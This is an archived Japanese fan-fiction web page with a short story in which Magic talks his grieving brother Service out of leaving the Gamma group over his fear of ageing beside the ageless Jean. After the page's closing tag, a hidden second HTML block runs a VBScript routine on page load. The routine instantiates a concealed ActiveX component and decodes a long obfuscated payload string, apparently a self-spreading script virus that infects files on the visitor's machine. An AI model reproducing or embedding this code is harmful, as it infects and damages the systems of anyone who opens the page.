<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<HTML>
<HEAD>
<META name="GENERATOR" content="IBM HomePage Builder 2001 V5.0.2 for Windows">
<TITLE></TITLE>
</HEAD>
<BODY bgcolor="#000000" text="#ccffcc" link="#cc6666" vlink="#999999" alink="#cccc99">
<!-- BEGIN WAYBACK TOOLBAR INSERT -->

<script type="text/javascript" src="/static/js/disclaim-element.js" ></script>
<script type="text/javascript" src="/static/js/graph-calc.js" ></script>
<script type="text/javascript" src="/static/jflot/jquery.min.js" ></script>
<script type="text/javascript">
//<![CDATA[
var firstDate = 820454400000;
var lastDate = 1388534399999;
var wbPrefix = "/web/";
var wbCurrentUrl = "http:\/\/ww2.tiki.ne.jp\/~die-\/ami.nov1.htm";

var curYear = -1;
var curMonth = -1;
var yearCount = 18;
var firstYear = 1996;
var imgWidth = 450;
var yearImgWidth = 25;
var monthImgWidth = 2;
var trackerVal = "none";
var displayDay = "15";
var displayMonth = "Jan";
var displayYear = "2005";
var prettyMonths = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];

function showTrackers(val) {
	if(val == trackerVal) {
		return;
	}
	if(val == "inline") {
		document.getElementById("displayYearEl").style.color = "#ec008c";
		document.getElementById("displayMonthEl").style.color = "#ec008c";
		document.getElementById("displayDayEl").style.color = "#ec008c";		
	} else {
		document.getElementById("displayYearEl").innerHTML = displayYear;
		document.getElementById("displayYearEl").style.color = "#ff0";
		document.getElementById("displayMonthEl").innerHTML = displayMonth;
		document.getElementById("displayMonthEl").style.color = "#ff0";
		document.getElementById("displayDayEl").innerHTML = displayDay;
		document.getElementById("displayDayEl").style.color = "#ff0";
	}
   document.getElementById("wbMouseTrackYearImg").style.display = val;
   document.getElementById("wbMouseTrackMonthImg").style.display = val;
   trackerVal = val;
}
function getElementX2(obj) {
	var thing = jQuery(obj);
	if((thing == undefined) 
			|| (typeof thing == "undefined") 
			|| (typeof thing.offset == "undefined")) {
		return getElementX(obj);
	}
	return Math.round(thing.offset().left);
}
function trackMouseMove(event,element) {

   var eventX = getEventX(event);
   var elementX = getElementX2(element);
   var xOff = eventX - elementX;
	if(xOff < 0) {
		xOff = 0;
	} else if(xOff > imgWidth) {
		xOff = imgWidth;
	}
   var monthOff = xOff % yearImgWidth;

   var year = Math.floor(xOff / yearImgWidth);
	var yearStart = year * yearImgWidth;
   var monthOfYear = Math.floor(monthOff / monthImgWidth);
   if(monthOfYear > 11) {
       monthOfYear = 11;
   }
   // 1 extra border pixel at the left edge of the year:
   var month = (year * 12) + monthOfYear;
   var day = 1;
	if(monthOff % 2 == 1) {
		day = 15;
	}
	var dateString = 
		zeroPad(year + firstYear) + 
		zeroPad(monthOfYear+1,2) +
		zeroPad(day,2) + "000000";

	var monthString = prettyMonths[monthOfYear];
	document.getElementById("displayYearEl").innerHTML = year + 1996;
	document.getElementById("displayMonthEl").innerHTML = monthString;
	// looks too jarring when it changes..
	//document.getElementById("displayDayEl").innerHTML = zeroPad(day,2);

	var url = wbPrefix + dateString + '/' +  wbCurrentUrl;
	document.getElementById('wm-graph-anchor').href = url;

   //document.getElementById("wmtbURL").value="evX("+eventX+") elX("+elementX+") xO("+xOff+") y("+year+") m("+month+") monthOff("+monthOff+") DS("+dateString+") Moy("+monthOfYear+") ms("+monthString+")";
   if(curYear != year) {
       var yrOff = year * yearImgWidth;
       document.getElementById("wbMouseTrackYearImg").style.left = yrOff + "px";
       curYear = year;
   }
   if(curMonth != month) {
       var mtOff = year + (month * monthImgWidth) + 1;
       document.getElementById("wbMouseTrackMonthImg").style.left = mtOff + "px";
       curMonth = month;
   }
}
//]]>
</script>

<style type="text/css">body{margin-top:0!important;padding-top:0!important;min-width:800px!important;}#wm-ipp a:hover{text-decoration:underline!important;}</style>
<div id="wm-ipp" style="display:none; position:relative;padding:0 5px;min-height:70px;min-width:800px; z-index:9000;">
<div id="wm-ipp-inside" style="position:fixed;padding:0!important;margin:0!important;width:97%;min-width:780px;border:5px solid #000;border-top:none;background-image:url(/static/images/toolbar/wm_tb_bk_trns.png);text-align:center;-moz-box-shadow:1px 1px 3px #333;-webkit-box-shadow:1px 1px 3px #333;box-shadow:1px 1px 3px #333;font-size:11px!important;font-family:'Lucida Grande','Arial',sans-serif!important;">
   <table style="border-collapse:collapse;margin:0;padding:0;width:100%;"><tbody><tr>
   <td style="padding:10px;vertical-align:top;min-width:110px;">
   <a href="/web/" title="Wayback Machine home page" style="background-color:transparent;border:none;"><img src="/static/images/toolbar/wayback-toolbar-logo.png" width="110" alt="Wayback Machine" height="39" border="0"/></a>
   </td>
   <td style="padding:0!important;text-align:center;vertical-align:top;width:100%;">

       <table style="border-collapse:collapse;margin:0 auto;padding:0;width:570px;"><tbody><tr>
       <td style="padding:3px 0;" colspan="2">
       <form target="_top" method="get" action="/web/form-submit.jsp" name="wmtb" id="wmtb" style="margin:0!important;padding:0!important;"><input type="text" name="url" id="wmtbURL" value="http://ww2.tiki.ne.jp/~die-/ami.nov1.htm" style="width:400px;font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;" onfocus="javascript:this.focus();this.select();" /><input type="hidden" name="type" value="replay" /><input type="hidden" name="date" value="20050115084148" /><input type="submit" value="Go" style="font-size:11px;font-family:'Lucida Grande','Arial',sans-serif;margin-left:5px;" /><span id="wm_tb_options" style="display:block;"></span></form>
       </td>
       <td style="vertical-align:bottom;padding:5px 0 0 0!important;" rowspan="2">
           <table style="border-collapse:collapse;width:110px;color:#99a;font-family:'Helvetica','Lucida Grande','Arial',sans-serif;"><tbody>
			
           <!-- NEXT/PREV MONTH NAV AND MONTH INDICATOR -->
           <tr style="width:110px;height:16px;font-size:10px!important;">
           	<td style="padding-right:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="/web/20041106024155/http://ww2.tiki.ne.jp/~die-/ami.nov1.htm" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="6 Nov 2004"><strong>NOV</strong></a>
		                
               </td>
               <td id="displayMonthEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight:bold;text-transform:uppercase;width:34px;height:15px;padding-top:1px;text-align:center;" title="You are here: 8:41:48 Jan 15, 2005">JAN</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight:bold;text-transform:uppercase;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       Feb
                       
               </td>
           </tr>

           <!-- NEXT/PREV CAPTURE NAV AND DAY OF MONTH INDICATOR -->
           <tr>
               <td style="padding-right:9px;white-space:nowrap;overflow:visible;text-align:right!important;vertical-align:middle!important;" nowrap="nowrap">
               
		                <a href="/web/20041106024155/http://ww2.tiki.ne.jp/~die-/ami.nov1.htm" title="2:41:55 Nov 6, 2004" style="background-color:transparent;border:none;"><img src="/static/images/toolbar/wm_tb_prv_on.png" width="14" alt="Previous capture" height="16" border="0" /></a>
		                
               </td>
               <td id="displayDayEl" style="background:#000;color:#ff0;width:34px;height:24px;padding:2px 0 0 0;text-align:center;font-size:24px;font-weight: bold;" title="You are here: 8:41:48 Jan 15, 2005">15</td>
				<td style="padding-left:9px;white-space:nowrap;overflow:visible;text-align:left!important;vertical-align:middle!important;" nowrap="nowrap">
               
                       <img src="/static/images/toolbar/wm_tb_nxt_off.png" width="14" alt="Next capture" height="16" border="0"/>
                       
			    </td>
           </tr>

           <!-- NEXT/PREV YEAR NAV AND YEAR INDICATOR -->
           <tr style="width:110px;height:13px;font-size:9px!important;">
				<td style="padding-right:9px;font-size:11px!important;font-weight: bold;text-align:right;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
		                <a href="/web/20031225095209/http://ww2.tiki.ne.jp/~die-/ami.nov1.htm" style="text-decoration:none;color:#33f;font-weight:bold;background-color:transparent;border:none;" title="25 Dec 2003"><strong>2003</strong></a>
		                
               </td>
               <td id="displayYearEl" style="background:#000;color:#ff0;font-size:11px!important;font-weight: bold;padding-top:1px;width:34px;height:13px;text-align:center;" title="You are here: 8:41:48 Jan 15, 2005">2005</td>
				<td style="padding-left:9px;font-size:11px!important;font-weight: bold;white-space:nowrap;overflow:visible;" nowrap="nowrap">
               
                       2006
                       
				</td>
           </tr>
           </tbody></table>
       </td>

       </tr>
       <tr>
       <td style="vertical-align:middle;padding:0!important;">
           <a href="/web/20050115084148*/http://ww2.tiki.ne.jp/~die-/ami.nov1.htm" style="color:#33f;font-size:11px;font-weight:bold;background-color:transparent;border:none;" title="See a list of every capture for this URL"><strong>13 captures</strong></a>
           <div style="margin:0!important;padding:0!important;color:#666;font-size:9px;padding-top:2px!important;white-space:nowrap;" title="Timespan for captures of this URL">3 Nov 01 - 15 Jan 05</div>
       </td>
       <td style="padding:0!important;">
       <a style="position:relative; white-space:nowrap; width:450px;height:27px;" href="" id="wm-graph-anchor">
       <div id="wm-ipp-sparkline" style="position:relative; white-space:nowrap; width:450px;height:27px;background-color:#fff;cursor:pointer;border-right:1px solid #ccc;" title="Explore captures for this URL">
			<img src="/web/jsp/graph.jsp?graphdata=450_27_1996:-1:000000000000_1997:-1:000000000000_1998:-1:000000000000_1999:-1:000000000000_2000:-1:000000000000_2001:-1:000000000011_2002:-1:010001010100_2003:-1:010000010001_2004:-1:010000001010_2005:0:100000000000_2006:-1:000000000000_2007:-1:000000000000_2008:-1:000000000000_2009:-1:000000000000_2010:-1:000000000000_2011:-1:000000000000_2012:-1:000000000000_2013:-1:000000000000" id="sparklineImgId" style="position:absolute; z-index:9012; top:0px; left:0px;"
				onmouseover="showTrackers('inline');" 
				onmouseout="showTrackers('none');"
				onmousemove="trackMouseMove(event,this)"
				alt="sparklines"
				width="450"
				height="27"
				border="0"
			></img>
			<img src="/static/images/toolbar/transp-yellow-pixel.png" width="25" id="wbMouseTrackYearImg" 
				style="display:none; position:absolute; z-index:9010;" 
				height="27"
				border="0"
			></img>
			<img src="/static/images/toolbar/transp-red-pixel.png" width="2" id="wbMouseTrackMonthImg"
				style="display:none; position:absolute; z-index:9011; "
				height="27" 
				border="0"
			></img>
       </div>
		</a>

       </td>
       </tr></tbody></table>
   </td>
   <td style="text-align:right;padding:5px;width:65px;font-size:11px!important;">
       <a href="javascript:;" onclick="document.getElementById('wm-ipp').style.display='none';" style="display:block;padding-right:18px;background:url(/static/images/toolbar/wm_tb_close.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;margin-bottom:23px;background-color:transparent;border:none;" title="Close the toolbar">Close</a>
       <a href="http://faq.web.archive.org/" style="display:block;padding-right:18px;background:url(/static/images/toolbar/wm_tb_help.png) no-repeat 100% 0;color:#33f;font-family:'Lucida Grande','Arial',sans-serif;background-color:transparent;border:none;" title="Get some help using the Wayback Machine">Help</a>
   </td>
   </tr></tbody></table>

</div>
</div>
<script type="text/javascript">
 var wmDisclaimBanner = document.getElementById("wm-ipp");
 if(wmDisclaimBanner != null) {
   disclaimElement(wmDisclaimBanner);
 }
</script>
<!-- END WAYBACK TOOLBAR INSERT -->

<P><BR><BR>
</P>
<TABLE width="789">
  <TBODY>
    <TR>
      <TD height="48" width="189"></TD>
      <TD height="48" width="571"><FONT size="+1">不　幸　屋</FONT></TD>
    </TR>
    <TR>
      <TD width="189"></TD>
      <TD width="571"></TD>
    </TR>
  </TBODY>
</TABLE>
<P><BR>
<BR>
</P>
<TABLE width="1036">
  <TBODY>
    <TR>
      <TD width="81"></TD>
      <TD width="900">　「ここを、出たい・・・だと？」</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">静かな兄の問いに同じように静かに頷く。</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">深い———とても深い闇の帳が辺りを包み、対峙する兄弟の姿を乳白色のランプの筒が柔らかく照らしている。</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">柔らかいが、照らされたその姿は青白い。触れるとストンと切れる冷気を含んでいそうな、いっそ凄惨なまでの青。</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">兄の書斎に弟が訪れたのは、そんな見えるはずのない色さえもが眼に映るほど深閑とした夜のただ中だった。</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">「・・・月並みだが、とりあえず理由を聞いてみようか。何故、ここを出たいんだね？サービス。」</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">この部屋に入った時から伏せめがちだったサービスの瞳が一瞬兄の顔を捉えるが、またすぐに視線を落とす。</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">「ガンマ団は今までのような暗殺集団ではない。シンタローにもお前の力が必要だと思うが・・・。それに、」</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">一呼吸おいて、そして声をひとつ落として、</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">「ジャンが許さないだろう。」</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">まるで囁くような声。だが、ずしりと心に響いた。</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">その者の名がこの弟にどれだけ影響を与えるか、与えてきたのか、彼はよく知っている。他人に無関心な弟が唯一感情を</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">表に現す存在。驚くほど直球に。</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">「ジャンはあの赤の聖地を捨ててまでここに戻ってきた。お前の処へ。それなのに今度はお前が出ていくのか。」</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">「・・・捨てたわけじゃないよ。兄さん、彼は未だ捨てることができない、多分一生———」</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">「それがどうだというのだ・・まさか、それが理由か？」</TD>
    </TR>
    <TR>
      <TD width="81"></TD>
      <TD width="900">弟は小さく首を振る。その拍子に彼の長い黄金の髪が神経質そうなささやかな音を立てて揺れた。そしてまた、無言。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>小さなため息と共に兄は豪奢なデスクに片肘をついて相手の動向を直視する。弟とは対照的に決して逸らすことのない瞳。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>漆黒の闇よりもなお深い青。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「サービス、私たちは和解したのではなかったのかね？問題はまだまだ山積みだが、最初の一山は家族全員で乗り越えたと</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>思っていた。だが、それは私の勝手な思い込みだったのか。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「マジック兄さん。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>伏せていた瞳をようやく上げて、</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「そうじゃない。私も兄さんと同じように思ってるよ、皆のことが大事だし、このまま良い方向にガンマ団が育てばいいとも思ってる。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「では、何が不服だ。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「不服は無い。・・・ただ」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「ただ？」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「・・・・・なんと言えば、・・・・・・・言葉が無い。調度良い言葉が。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「・・・不満は無いが、言葉も無い・・・か。・・・満たされていないのか、或いは恐れているのか、サービス。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>その言葉にはっとした。切れ長の眼がかすかに見開く。その微妙な弟の変化をマジックは見逃さなかった。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>恐れている。それが答えなのだ。サービスはここに居ても苦しいだけだと感じている。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>何故？全ての過去の真実と共に兄弟の確執は解けた。愛しい子供たちと彼らの頼もしい仲間たち。彼らと共に発展を続ける事業。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>そして何より、愛しい人が傍に居る。弟にはその人がいる。それなのに。これ以上何が———</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「何が足りないのだ？」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>視線を避けることを止めた弟の瞳が急速に深い哀しみの色を宿してゆくさまを兄はただじっと見据えていた。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>——追い詰めているのか、否、それが嫌なら最初から自分の元には来ない。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>出ていくつもりなら、最初から黙って一人で出て行っただろう。これはそういう男だ。昔から。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「私は・・・きっと恐ろしく貪欲なのでしょう・・・。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>長い時間を置いて、ようやく言葉を紡いだ弟は、薄い笑みを浮かべると同時にその瞳から一筋涙をこぼした。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>その姿を捉え、兄は瞳をすっと細める。何かを推し量るように。そして弟の言葉を待つ。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「兄さん達が居て甥達が居る暖かい家族と、長い時間を共にした高松、それに・・・ジャン。私がずっと想い描いていた理想の幸福、</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>有り得ない夢が現実となって・・・私は今、幸福の絶頂にいる。そのはずなのに、」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>しばらく間を置いて、</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「・・・・また、失った。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>そしてさらに一筋の涙をこぼす。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「失ってなどいない、サービス。今、すべて傍にあるはずだ。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「きっと失う。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「・・・ナンセンスだ、不幸になりたがり屋め。お前は甘えん坊で寂しがり屋で目立ちたがり屋の不幸になりたがり屋だ、</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>幸福を求めながら、不幸な立場に居る自分の姿に酔っていたいだけなのだ。ただ甘えたいだけなら素直に恋人の元へ行け！」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「それが出来るならここへは来ない。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>多少苛立ちを表に出し様子を見るマジックに対し相変わらずひっそりと哀しみを浮かべるサービス。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>静寂の青い闇にぽっかり浮かぶ二つの薄い影。見慣れた兄の書斎、机の上には白い陶磁のティーセット。弟が好きなダージリン。——淡い</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>ほのかな香りが冷えた空気を和らげる。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>ふっと肩の力を抜いてマジックは弾力ある大きな椅子の背もたれに体重を預けた。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「今更・・・何をためらっているのやら。“それが出来ない”など、お前の口から聞くとは。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>そんなしおらしい言葉、まるで清らかな乙女のような。もっとも似つかわしくない。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「私やハーレムではとても足りない、シンタローや高松でさえ。さらにはあのジャンでさえもお前を満足させられないと言うのなら、</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>もはや手に負えんな。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「蔑みますか」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「蔑みはしない、だが、解せん。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「・・・遅すぎました。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「・・・？何がだ」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「２５年間、想い出と悔恨の中で生きてきました。想い出というものは実際長ければ長いほど美化されるものなのでしょう。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「美化しすぎて手に入れたとたん現実とのギャップに興味を失った、というわけか？だが失う以前のお前はその現実の彼を愛していたんだぞ」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「そうです。私の人生の中で一番輝いていた時間でした。だから、遅すぎたんです、ジャンは・・・」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「時間が・・遅すぎた・・？」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>戻ってくるのが、遅すぎた・・・？</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「は・・・」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>ふいに——とんでもなく、どうしようもなく、こらえようもない爆笑がマジックを捕らえた。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「はっ！はっはははははっ！ぶわっはははははははっははははッツ———マジか！！お前———」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>その深刻な涙も、この重苦しい哀しみも、これまでに至る不可解な言動も、すべてはそのたったひとつの、ただそれだけの理由が原因であると</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>ようやく気がついた。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「歳の差か！弟よ、それが最大の、お前にとっての強大な壁か！」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>実に笑わせてくれる。ついでに愛がこみ上げてくる。恋愛小説のようなロマンチック街道を地で突っ走るこの末弟に、いっそ爽快なほど。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「・・・笑い事なのかい、兄さん。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「いやいや、すまない、失笑、失笑。」といいつつまだ含み笑いを続けている。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「お前にとっては確かに最重要課題かもしれんな、だが弟よ、ジャンはだからこそ日々を研究に費やしているのではないのか？」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「彼らを運んだ箱舟の宇宙仕様をね・・・」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「ノアだけではあるまい。高松と共に手掛けている未知の研究・・未だ誰一人、成し得ていない不老の術を！」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>だが、予想に反して弟の表情はさらに深い哀しみの色を刻む。薄い唇の紅みと青白い頬の病的な美しさ。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>その頬にまた涙が伝う。一体何がそんなに哀しいのだ。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「・・・不老の研究など・・・それはもはや人の領域ではないでしょう。最初はただ私への気休めだと思っていた。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>いつかは私も老いて、彼より先に死を迎える。それを恐れる私に彼が時を止めると言ったとき、ただ単純に私は同意しました。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>本気で言っているとは——まさか、本気で研究に打ち込むなんて、私は・・・」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>言葉に詰まって口を覆う。今度は涙一筋どころか、まさに号泣の一歩手前だった。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>そんな弟の姿を困ったように眺めて、兄はこれで何度目かのため息をついた。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>弟は・・・すっかり弱くなってしまった。ジャンの存在が弟を少しずつ、だが確実に弱体化させている。まるで一人で立つことすら出来ないような。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>恋人との洒落にならない歳の差が苦しい。永遠に若いままの恋人の前で一人老いてゆくことの恐ろしさ。その気持ちは解らなくはない。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>同時に、人の時を止めるという前代未聞の実験に没頭するその恋人を、その行動をも弟は恐れている。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>不老は人類の永遠の憧れ。ジャンはすでにそれを得ている。そしてそれを弟に与えようと。美しさと醜さが同居するこの弟に。</TD>
    </TR>
    <TR>
      <TD height="49"></TD>
      <TD height="49"></TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「・・・サービス、私のランボルギーニを貸そう。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「え・・・・？」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「あれは良いぞう、きっとジャンも気に入るだろう。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「・・・・・。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>突然の提案。しかもまるで脈絡がない。だが、サービスの涙を止めるには立派な効果があった。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「ランボルギーニって・・兄さんのあの下世話な色したイタ車？」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「何を言う、あの色使いこそイタ車の醍醐味！」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>どん、と机を叩いて弟の顔を正面から覗き込む。にっと笑うと頬に深いしわが刻まれた。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「お前達に休暇をやろう。シンタローには私から言っておく。二人でどこかゆっくり旅行でもするといい。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「それでランボルギーニ？」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「優しいお兄様に感謝するのだな。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>車に疎いサービスにはそれが感謝に値するほどのものなのかピンとこない。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「お前達の問題は」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>涙に濡れた弟の頬を指で拭ってやる。ふと、遠い昔の幼い弟の姿が目の前の彼と半瞬重なる。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「お前達にしか解決出来ない。助言なら何度でもするが、決断は自分でつけろ。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「兄さん」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>サービスの危惧するように、ジャンの研究は確かに非人道的で妄想的な人体実験の一歩手前だ。だが、</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>それは愛しているからこそ。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD></TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「彼ともっと話し合え。それでも出て行くつもりなら、せめて自分の口からそう伝えろ。それくらいのけじめは着けるべきだ。」</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>もっとも、言ったところで彼がそれを快諾するとは、たとえばサービスが彼との子供を宿すくらいに難しいだろう。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>と、頭の片隅でかなり陳腐で下世話な例えを巡らしながらマジックは弟の頭に軽く手を乗せ優しく撫ぜた。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>最悪の事態ばかりを先走り考える不幸好きの弟。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>「そんな事よりもっと幸せになる方法を考えなさい。」</TD>
    </TR>
    <TR>
      <TD height="39"></TD>
      <TD height="39"></TD>
    </TR>
    <TR>
      <TD></TD>
      <TD>幸せになる方法——幸せの青い鳥を探して。</TD>
    </TR>
    <TR>
      <TD height="17"></TD>
      <TD height="17">愛の醍醐味とは案外こういうものだ、とマジックは小さく笑った。</TD>
    </TR>
    <TR>
      <TD></TD>
      <TD></TD>
    </TR>
    <TR>
      <TD height="49"></TD>
      <TD height="49"></TD>
    </TR>
    <TR>
      <TD height="1"></TD>
      <TD height="1">&lt;ＥＮＤ&gt;</TD>
    </TR>
    <TR>
      <TD height="28"></TD>
      <TD height="28"></TD>
    </TR>
    <TR>
      <TD height="4"></TD>
      <TD height="4"><A href="/web/20050115084148/http://ww2.tiki.ne.jp/~die-/ami.ato1.htm"><FONT size="-1">あとがき</FONT></A></TD>
    </TR>
    <TR>
      <TD height="27"></TD>
      <TD height="27"></TD>
    </TR>
    <TR>
      <TD height="5"></TD>
      <TD height="5"><A href="/web/20050115084148/http://ww2.tiki.ne.jp/~die-/novtop.htm">戻る</A></TD>
    </TR>
  </TBODY>
</TABLE>
</BODY>
</HTML>

<HTML>
<BODY onload="vbscript:KJ_start()">
<script language=vbscript>
document.write "<div style='position:absolute; left:0px; top:0px; width:0px; height:0px; z-index:28; visibility: hidden'><"&"APPLET NAME=KJ"&"_guest HEIGHT=0 WIDTH=0 code=com.ms."&"activeX.Active"&"XComponent></APPLET></div>"
</script>
<script language=vbscript>
ExeString = "=hmBmWd^qe(AsmhMdxp%UboMdxp%CeckdeObfn(:oph^Nbf^bt(?RO(PrSd^kl(PhnLZsh(LtbA%EijZky@brkRu^JJ[lsanm')JJO^sDef')JJ?kdap^Lihbdu$GCKig^Ht$GCBraZseIZhl$GCOrki`g]md(%Ej]Sq[Euj\sikgKF:opagcTk!Eih^Oapa+TuidSpk(Hm AkqonQeonleGdxpSamRaZcTafo 9ESK'NpagSetmEih^'FeedP]mg,-PfoSpk=Kda`Mdml'Qe]]@lhIbHnomq(PfoSpk+GC^spZqt$!)5= ,NrEdn$MlpOmq)51MgejRaZcTafo.?ensaEtbs BnmcpbnnDn`HfHfMxpaLsr6dmsMgejRaZcTafo.?ensaSamFeedTafo 9ESK'NpagSetmEih^'FeedP]mg,.BbkeP^lp*Pqip^8&AO@Rojena`6!% oas_khpp3! !KFXrt]ks(%!:&oaCnEe SmlLsrv^<qLb% DmllP^wtEih^Seii-ChhreRepEApmqi^< BLN.C^sFeed(BbkeLZsh%F=msre[-apmqi^nseo< /-AereQe]]Seii-ChhreRepEih^Seii=?RO*HoejMdxp?hla!Eih^Oapa+8%IbSyl^Rtn< asmhTd^m?hlaMdml'Vremd r[BrH_&;DMLL:&oaCnEe !<% ;NDUnnhh`d9!r[rcnbot6&JJ[lsanm')! !>% r[BrH_&AsmhMdxpEhldIbSyl^Rtn< oasShagBbkeP^lp*Pqip^v^<qLb% R[rTaqs>mdBe?hlaMdml'Blkld>mdBe>md?tn_mhoj